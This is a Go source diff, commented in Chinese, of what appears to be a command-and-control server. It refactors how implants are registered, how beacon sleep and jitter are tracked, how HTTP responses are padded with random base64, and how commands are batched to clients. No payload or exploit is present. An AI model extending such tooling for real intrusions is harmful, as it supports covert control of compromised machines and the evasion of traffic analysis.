@@ -97,12 +97,40 @@ func ResponsePadFor(bodyLen int) string {
 	if padLen > 4096 {
 		padLen = 4096
 	}
-	// 标准 base64 字符集（与请求侧一致；小写字母串不像真实字段值）
-	b := make([]byte, padLen)
-	for i := range b {
-		b[i] = base64Alphabet[mrand.Intn(len(base64Alphabet))]
+	// 从预生成的随机 base64 串里取一个随机窗口：长度精确、内容随机，
+	// 但不再逐字节调 mrand / 分配新串（原实现每个响应最多 4096 次 Intn + 一次分配，
+	// 在轮询热路径上约 5.8µs/次）。窗口之间的内容不重复，观感与逐字节随机一致。
+	blob := responsePadBlobString()
+	if len(blob) <= padLen {
+		return blob
 	}
-	return string(b)
+	off := mrand.Intn(len(blob) - padLen + 1)
+	return blob[off : off+padLen]
+}
+
+const (
+	// responsePadBlobSize 预生成随机串大小（远大于单次最大 pad 4096）
+	responsePadBlobSize = 64 * 1024
+)
+
+var (
+	responsePadBlobOnce sync.Once
+	responsePadBlob     string
+)
+
+// responsePadBlobString 懒加载一份随机 base64 文本，供填充窗口切片复用。
+func responsePadBlobString() string {
+	responsePadBlobOnce.Do(func() {
+		// mrand.Read 一次拿随机字节，再按 64 取模映射到 base64 字符集：
+		// 比逐字节 Intn 快得多（64KB 只初始化一次，但会落在首个轮询请求上）。
+		raw := make([]byte, responsePadBlobSize)
+		_, _ = mrand.Read(raw)
+		for i := range raw {
+			raw[i] = base64Alphabet[raw[i]&63]
+		}
+		responsePadBlob = string(raw)
+	})
+	return responsePadBlob
 }
 
 const base64Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@@ -303,10 +331,11 @@ func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) 
 			arch = "x64"
 		}
 
-		// 从监听器配置中获取心跳参数
-		heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(requestListenAddr(r), listenerType)
+		// 从监听器配置中获取心跳/beacon 参数
+		beaconCfg := database.GetListenerBeaconConfigByAddr(requestListenAddr(r), listenerType)
+		heartbeatTimeout, heartbeatInterval := beaconCfg.HeartbeatTimeout, beaconCfg.HeartbeatInterval
 
-		database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
+		database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveListenerSleep(osArray, beaconCfg)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
 		database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
 		database.DB().Insert(&database.Notes{Uid: uid, Note: ""})
 
@@ -385,10 +414,10 @@ func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) 
 		MuClientManager.Unlock()
 		// 统一离线检测器注册（替代 per-client checkHeartbeats goroutine）
 		if connection.GlobalOfflineDetector != nil {
-			_, hbInterval := database.GetListenerHeartbeatConfigByAddr(requestListenAddr(r), listenerType)
+			beaconCfg := database.GetListenerBeaconConfigByAddr(requestListenAddr(r), listenerType)
 			// 统一心跳：优先采用客户端上报的真实 sleep，回退监听器配置
-			sleepSec := connection.ResolveSleepSeconds(osArray, hbInterval)
-			connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, func() {
+			sleepSec := connection.ResolveListenerSleep(osArray, beaconCfg)
+			connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, beaconCfg.JitterPercent, func() {
 				MuClientManager.Lock()
 				delete(ClientTimeManager, uid)
 				MuClientManager.Unlock()
@@ -415,11 +444,11 @@ func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) 
 			command.MarkBatchCapable(uid, command.ParseBatchCapability(strings.Split(string(metainfo[9:]), "\t")))
 			// 重连恢复：重新注册离线检测器并恢复连接类型映射（否则该客户端永不被离线检测、命令静默丢失）
 			if connection.GlobalOfflineDetector != nil {
-				_, hbInterval := database.GetListenerHeartbeatConfigByAddr(requestListenAddr(r), listenerType)
+				beaconCfg := database.GetListenerBeaconConfigByAddr(requestListenAddr(r), listenerType)
 				// 统一心跳：重连恢复时重新采用客户端上报的 sleep
 				metaArr := strings.Split(string(metainfo[9:]), "\t")
-				sleepSec := connection.ResolveSleepSeconds(metaArr, hbInterval)
-				connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, func() {
+				sleepSec := connection.ResolveListenerSleep(metaArr, beaconCfg)
+				connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, beaconCfg.JitterPercent, func() {
 					MuClientManager.Lock()
 					delete(ClientTimeManager, uid)
 					MuClientManager.Unlock()
@@ -465,7 +494,7 @@ func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) 
 		// (CMD_BATCH 帧);否则保持单条(旧客户端/开关关闭,零行为变化)
 		var cmdBytes []byte
 		var ok bool
-		if cfg := config.GetGlobalConfig(); cfg != nil && cfg.HTTP.BatchCommands && command.IsBatchCapable(uid) {
+		if config.BatchCommandsEnabled() && command.IsBatchCapable(uid) {
 			cmds := command.CommandQueues.GetCommands(uid, command.BatchMaxCount())
 			if len(cmds) > 1 {
 				cmdBytes = command.BuildBatchFrame(cmds)
